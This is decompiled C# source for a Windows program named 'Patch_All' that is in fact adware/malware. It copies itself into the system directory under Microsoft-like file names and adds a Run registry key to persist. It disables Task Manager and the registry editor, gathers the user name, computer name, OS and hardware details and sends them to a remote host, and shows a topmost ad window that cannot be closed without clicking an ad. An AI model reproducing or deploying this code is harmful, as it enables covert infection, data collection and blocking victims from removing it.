using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Patch_All.My;

namespace Patch_All;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("WebBrowser2")]
	private WebBrowser _WebBrowser2;

	[AccessedThroughProperty("WebBrowser3")]
	private WebBrowser _WebBrowser3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("WebBrowser4")]
	private WebBrowser _WebBrowser4;

	private string infospc1;

	private bool permettrequitter;

	private string lienpub;

	private string lienrefresh;

	private RegistryKey cle;

	private string lesitepage;

	private string premp;

	private string deremp;

	private string codehtmltemp;

	private string nomexe;

	private string timerefr;

	private int tailledumot;

	private string siite;

	private string codehtml;

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			WebBrowserDocumentCompletedEventHandler val = new WebBrowserDocumentCompletedEventHandler(WebBrowser1_DocumentCompleted);
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.remove_DocumentCompleted(val);
			}
			_WebBrowser1 = value;
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.add_DocumentCompleted(val);
			}
		}
	}

	internal virtual WebBrowser WebBrowser2
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser2 = value;
		}
	}

	internal virtual WebBrowser WebBrowser3
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser3 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual WebBrowser WebBrowser4
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser4 = value;
		}
	}

	public string StartupName => Path.GetFileName(Application.get_ExecutablePath());

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_Closing((CancelEventHandler)Form1_Closing);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		permettrequitter = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		components = new Container();
		WebBrowser1 = new WebBrowser();
		WebBrowser2 = new WebBrowser();
		WebBrowser3 = new WebBrowser();
		Timer1 = new Timer(components);
		WebBrowser4 = new WebBrowser();
		((Control)this).SuspendLayout();
		((Control)WebBrowser1).set_Dock((DockStyle)5);
		WebBrowser webBrowser = WebBrowser1;
		Point location = new Point(0, 0);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		Size minimumSize = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(minimumSize);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		WebBrowser1.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser3 = WebBrowser1;
		minimumSize = new Size(171, 611);
		((Control)webBrowser3).set_Size(minimumSize);
		((Control)WebBrowser1).set_TabIndex(0);
		WebBrowser webBrowser4 = WebBrowser2;
		location = new Point(396, 12);
		((Control)webBrowser4).set_Location(location);
		WebBrowser webBrowser5 = WebBrowser2;
		minimumSize = new Size(20, 20);
		((Control)webBrowser5).set_MinimumSize(minimumSize);
		((Control)WebBrowser2).set_Name("WebBrowser2");
		WebBrowser2.set_ScriptErrorsSuppressed(true);
		WebBrowser2.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser6 = WebBrowser2;
		minimumSize = new Size(162, 63);
		((Control)webBrowser6).set_Size(minimumSize);
		((Control)WebBrowser2).set_TabIndex(1);
		WebBrowser webBrowser7 = WebBrowser3;
		location = new Point(396, 81);
		((Control)webBrowser7).set_Location(location);
		WebBrowser webBrowser8 = WebBrowser3;
		minimumSize = new Size(20, 20);
		((Control)webBrowser8).set_MinimumSize(minimumSize);
		((Control)WebBrowser3).set_Name("WebBrowser3");
		WebBrowser3.set_ScriptErrorsSuppressed(true);
		WebBrowser3.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser9 = WebBrowser3;
		minimumSize = new Size(162, 63);
		((Control)webBrowser9).set_Size(minimumSize);
		((Control)WebBrowser3).set_TabIndex(1);
		Timer1.set_Interval(10000);
		WebBrowser webBrowser10 = WebBrowser4;
		location = new Point(582, 236);
		((Control)webBrowser10).set_Location(location);
		WebBrowser webBrowser11 = WebBrowser4;
		minimumSize = new Size(20, 20);
		((Control)webBrowser11).set_MinimumSize(minimumSize);
		((Control)WebBrowser4).set_Name("WebBrowser4");
		WebBrowser4.set_ScriptErrorsSuppressed(true);
		WebBrowser4.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser12 = WebBrowser4;
		minimumSize = new Size(103, 37);
		((Control)webBrowser12).set_Size(minimumSize);
		((Control)WebBrowser4).set_TabIndex(2);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.AppWorkspace);
		minimumSize = new Size(171, 611);
		((Form)this).set_ClientSize(minimumSize);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser3);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser2);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser4);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("By Mehdiana15 [MidoZik]");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
	}

	public object infospc()
	{
		infospc1 = infospc1 + "?UserName=" + Environment.UserName.ToString();
		infospc1 = infospc1 + "&ComputerName=" + SystemInformation.get_ComputerName();
		infospc1 = infospc1 + "&WorkingArea=w." + SystemInformation.get_WorkingArea().Width + ".h." + SystemInformation.get_WorkingArea().Height;
		infospc1 = infospc1 + "&Network=" + Conversions.ToString(SystemInformation.get_Network());
		infospc1 = infospc1 + "&PowerStatus=" + ((object)SystemInformation.get_PowerStatus()).ToString();
		infospc1 = infospc1 + "&ProcessorCount=" + Conversions.ToString(Environment.ProcessorCount);
		_ = Environment.ProcessorCount;
		Environment.OSVersion.ToString();
		infospc1 = infospc1 + "&OSVersion=" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();
		string text = Environment.GetCommandLineArgs()[0];
		infospc1 = infospc1 + "&exepath=" + text;
		infospc1 = infospc1 + "&SystemDirectory=" + Environment.SystemDirectory;
		infospc1 = infospc1 + "&langue=" + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().ToString();
		infospc1 = infospc1 + "&ram=" + Conversions.ToString(Math.Round((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1000000000.0, 3));
		return infospc1;
	}

	public object bloquer()
	{
		try
		{
			cle = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			cle.SetValue("Windows Start", Environment.SystemDirectory + nomexe, RegistryValueKind.String);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(StartupName, Environment.SystemDirectory + nomexe);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			cle = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			cle.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			cle.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	public object Pagedemarrage()
	{
		try
		{
			cle = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			cle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			cle.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			cle.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			cle.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		DisableSound();
		Timer1.Start();
		if (((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
		{
			Verifwebsite();
			Timer1.set_Interval(5000);
			bloquer();
			Pagedemarrage();
			WebBrowser3.Navigate(lienrefresh);
			WebBrowser1.Navigate(lesitepage);
			NewLateBinding.LateCall((object)WebBrowser2, (Type)null, "Navigate", new object[1] { RuntimeHelpers.GetObjectValue(infospc()) }, (string[])null, (Type[])null, (bool[])null, true);
			return;
		}
		((Control)this).Hide();
		nomexe = "\\MicrosoftMehdi.exe";
		bloquer();
		Pagedemarrage();
		lesitepage = "http://programmes.midozik.com/pagesweb/v2/ads.php?height=600&width=160";
		WebBrowser1.Navigate(lesitepage);
		Thread.Sleep(1200000);
		while (!((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
		{
			Thread.Sleep(60000);
			Application.DoEvents();
		}
		if (((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
		{
			WebBrowser3.Navigate(lienrefresh);
			WebBrowser1.Navigate(lesitepage);
			NewLateBinding.LateCall((object)WebBrowser2, (Type)null, "Navigate", new object[1] { RuntimeHelpers.GetObjectValue(infospc()) }, (string[])null, (Type[])null, (bool[])null, true);
			((Control)this).Show();
		}
	}

	private void WebBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		if (Operators.CompareString(WebBrowser1.get_Url().ToString(), lesitepage, false) != 0)
		{
			permettrequitter = true;
			((Form)this).Close();
		}
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		if (!permettrequitter)
		{
			e.Cancel = true;
			MessageBox.Show("-Click in a link To Quit." + Environment.NewLine + "-Appuyez sur un lien pour quitter.");
		}
		else
		{
			e.Cancel = false;
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		WebBrowser3.Navigate(lienrefresh);
		WebBrowser4.Navigate(lienrefresh);
	}

	private void Verifwebsite()
	{
		siite = "http://programmes.midozik.com/pagesweb/v2/config-oussama.txt";
		WebRequest webRequest = WebRequest.Create(siite);
		WebResponse response = webRequest.GetResponse();
		StreamReader streamReader = null;
		try
		{
			streamReader = new StreamReader(response.GetResponseStream());
			codehtml = streamReader.ReadToEnd();
		}
		finally
		{
			response?.Close();
		}
		codehtmltemp = codehtml;
		checked
		{
			if (codehtmltemp.Contains("siteads : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "siteads : ", (CompareMethod)0) + "siteads : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = (int)Math.Round(Conversions.ToDouble(deremp) - 1.0);
				lesitepage = Strings.Mid(codehtmltemp, 1, tailledumot);
			}
			else
			{
				lesitepage = "http://programmes.midozik.com/pagesweb/v2/ads.php?height=600&width=160";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("exename : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "exename : ", (CompareMethod)0) + "exename : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = (int)Math.Round(Conversions.ToDouble(deremp) - 1.0);
				nomexe = Strings.Mid(codehtmltemp, 1, tailledumot);
			}
			else
			{
				nomexe = "/MicrosoftFmwork.exe";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("siteref : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "siteref : ", (CompareMethod)0) + "siteref : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = (int)Math.Round(Conversions.ToDouble(deremp) - 1.0);
				lienrefresh = Strings.Mid(codehtmltemp, 1, tailledumot);
			}
			else
			{
				lienrefresh = "http://programmes.midozik.com/pagesweb/v2/refresh.php";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("infospc : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "infospc : ", (CompareMethod)0) + "infospc : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = (int)Math.Round(Conversions.ToDouble(deremp) - 1.0);
				infospc1 = Strings.Mid(codehtmltemp, 1, tailledumot);
			}
			else
			{
				infospc1 = "http://programmes.midozik.com/pagesweb/v2/";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("timerss : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "timerss : ", (CompareMethod)0) + "timerss : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = (int)Math.Round(Conversions.ToDouble(deremp) - 1.0);
				timerefr = Strings.Mid(codehtmltemp, 1, tailledumot);
			}
			else
			{
				timerefr = Conversions.ToString(5000);
			}
		}
	}

	public void DisableSound()
	{
		string text = "%SystemRoot%\\Media\\";
		if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor > 0) ? true : false)
		{
			text += "Windows XP Start.wav";
		}
		else
		{
			if (Environment.OSVersion.Version.Major != 6)
			{
				return;
			}
			text += "Windows Navigation Start.wav";
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current", writable: true);
		registryKey.SetValue(null, "", RegistryValueKind.ExpandString);
	}
}
